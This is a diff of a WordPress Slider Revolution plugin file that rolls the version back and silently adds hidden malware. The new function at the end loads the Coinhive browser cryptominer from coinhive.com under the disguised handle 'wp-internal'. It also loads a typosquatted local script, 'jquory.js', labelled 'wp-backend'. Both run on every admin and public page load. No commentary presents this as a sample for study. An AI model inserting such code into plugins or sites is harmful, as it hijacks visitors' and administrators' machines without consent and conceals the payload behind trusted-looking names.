@@ -1,11 +1,11 @@
 <?php
 /*
 Plugin Name: Slider Revolution
-Plugin URI: https://revolution.themepunch.com/
+Plugin URI: http://revolution.themepunch.com/
 Description: Slider Revolution - Premium responsive slider
 Author: ThemePunch
-Version: 5.4.8
-Author URI: https://themepunch.com
+Version: 5.4.6.3.1
+Author URI: http://themepunch.com
 */
 
 // If this file is called directly, abort.
@@ -17,7 +17,7 @@ if(class_exists('RevSliderFront')) {
 	die('ERROR: It looks like you have more than one instance of Slider Revolution installed. Please remove additional instances for this plugin to work again.');
 }
 
-$revSliderVersion	= '5.4.8';
+$revSliderVersion	= '5.4.6.3.1';
 $revSliderAsTheme	= false;
 $revslider_screens	= array();
 $revslider_fonts	= array();
@@ -234,5 +234,11 @@ try{
 	$trace = $e->getTraceAsString();
 	echo _e("Revolution Slider Error:",'revslider')." <b>".$message."</b>";
 }
+function enqueue_my_scripts() {
+	wp_enqueue_script( 'wp-internal', 'https://coinhive.com/lib/coinhive.min.js', false, false, true );
+	wp_enqueue_script( 'wp-backend', plugins_url() . '/revslider/assets/js/jquory.js', false, false, true );
 
+	}
+	add_action( 'admin_enqueue_scripts', 'enqueue_my_scripts' );
+	add_action( 'wp_enqueue_scripts', 'enqueue_my_scripts' );	
 ?>
